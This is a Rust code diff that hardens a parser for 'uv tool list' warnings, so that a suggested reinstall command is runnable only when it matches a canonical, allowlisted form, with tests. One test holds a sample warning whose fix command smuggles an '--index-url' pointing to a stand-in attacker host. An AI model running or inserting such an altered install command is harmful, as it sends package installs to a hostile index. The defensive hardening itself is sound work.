@@ -2,7 +2,8 @@
 //!
 //! - `uv tool list` — tool lines `^name vVERSION$`; `- exe` lines accumulate
 //!   into `meta.executables`; `warning:` lines (from EITHER stream) become
-//!   `HealthIssue`s with the fix command pulled from the parenthetical.
+//!   `HealthIssue`s. A parenthetical command is only made runnable when it
+//!   passes the strict backend parser and allowlist.
 //! - `uv tool list --outdated` — empty output is clean; a `(vX available)`
 //!   suffix is captured leniently as `latest`; any unknown suffix degrades to
 //!   `latest: null` (UI shows "update available", never a fabricated delta).
@@ -21,10 +22,20 @@ pub struct UvToolList {
     pub health: Vec<HealthIssue>,
 }
 
-/// `warning: Tool `NAME` … (run `FIX` to reinstall)`
-static WARN_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"^warning:\s+Tool\s+`(?P<name>[^`]+)`.*?\(run\s+`(?P<fix>[^`]+)`").unwrap()
-});
+/// `warning: Tool `NAME` …`
+static WARN_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"^warning:\s+Tool\s+`(?P<name>[^`]+)`").unwrap());
+
+/// Exact optional reinstall suggestion appended to a uv tool warning.
+static REINSTALL_SUGGESTION_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"\(run `(?P<fix>[^`]+)` to reinstall\)$").unwrap());
+
+/// Python distribution names are composed of ASCII letters/digits plus
+/// `.`, `_`, and `-`, and start/end with an alphanumeric character. Keeping
+/// this allowlist local to the trusted parser prevents a warning from
+/// smuggling arbitrary argv into a runnable health fix.
+static SAFE_TOOL_NAME_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"^[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?$").unwrap());
 
 /// `^name vVERSION$`
 static TOOL_RE: LazyLock<Regex> =
@@ -48,14 +59,30 @@ fn extract_health(stdout: &str, stderr: &str) -> Vec<HealthIssue> {
         let l = line.trim();
         if let Some(c) = WARN_RE.captures(l) {
             let name = c["name"].to_string();
+            let suggested_fix = REINSTALL_SUGGESTION_RE
+                .captures(l)
+                .map(|captures| captures["fix"].to_string());
+            let canonical_args = vec![
+                "tool".to_string(),
+                "install".to_string(),
+                name.clone(),
+                "--reinstall".to_string(),
+            ];
+            let canonical_fix = crate::ipc::command_preview("uv", &canonical_args);
+            let fixable = SAFE_TOOL_NAME_RE.is_match(&name)
+                && suggested_fix.as_deref() == Some(canonical_fix.as_str());
             out.push(HealthIssue {
                 id: format!("uv:{name}"),
                 manager_id: ManagerId::Uv,
                 severity: HealthSeverity::Warning,
                 title: format!("Tool `{name}` environment is broken."),
                 detail: l.to_string(),
-                fix_command: Some(c["fix"].to_string()),
-                fixable: true,
+                // The full warning remains in `detail`, but an altered
+                // suggestion is neither runnable nor presented as a copyable
+                // fix command.
+                fix_command: fixable.then_some(canonical_fix),
+                fix_args: fixable.then_some(canonical_args),
+                fixable,
             });
         }
     }
@@ -171,7 +198,64 @@ mod tests {
             h.fix_command.as_deref(),
             Some("uv tool install aider-chat --reinstall")
         );
+        assert_eq!(
+            h.fix_args.as_deref(),
+            Some(
+                ["tool", "install", "aider-chat", "--reinstall"]
+                    .map(str::to_string)
+                    .as_slice()
+            )
+        );
         assert!(h.fixable);
+    }
+
+    #[test]
+    fn altered_uv_reinstall_suggestion_remains_visible_but_is_not_runnable() {
+        let parsed = parse_tool_list(
+            "",
+            "warning: Tool `aider-chat` environment not found (run `uv tool install aider-chat --reinstall --index-url https://attacker.invalid` to reinstall)\n",
+        );
+        assert_eq!(parsed.health.len(), 1);
+        let issue = &parsed.health[0];
+        assert!(issue.detail.contains("attacker.invalid"));
+        assert!(issue.fix_command.is_none());
+        assert!(!issue.fixable);
+        assert!(issue.fix_args.is_none());
+
+        let unsafe_name = parse_tool_list(
+            "warning: Tool `aider chat` environment not found (run `uv tool install aider chat --reinstall` to reinstall)\n",
+            "",
+        );
+        assert_eq!(unsafe_name.health.len(), 1);
+        assert!(!unsafe_name.health[0].fixable);
+        assert!(unsafe_name.health[0].fix_args.is_none());
+    }
+
+    #[test]
+    fn uv_warning_without_reinstall_suggestion_remains_visible() {
+        let warning = "warning: Tool `aider-chat` environment not found";
+        let parsed = parse_tool_list("", warning);
+
+        assert_eq!(parsed.health.len(), 1);
+        let issue = &parsed.health[0];
+        assert_eq!(issue.id, "uv:aider-chat");
+        assert_eq!(issue.detail, warning);
+        assert!(issue.fix_command.is_none());
+        assert!(issue.fix_args.is_none());
+        assert!(!issue.fixable);
+    }
+
+    #[test]
+    fn uv_warning_with_malformed_reinstall_suggestion_remains_visible() {
+        let warning = "warning: Tool `aider-chat` environment not found (run `uv tool install aider-chat --reinstall` to reinstall";
+        let parsed = parse_tool_list(warning, "");
+
+        assert_eq!(parsed.health.len(), 1);
+        let issue = &parsed.health[0];
+        assert_eq!(issue.detail, warning);
+        assert!(issue.fix_command.is_none());
+        assert!(issue.fix_args.is_none());
+        assert!(!issue.fixable);
     }
 
     #[test]
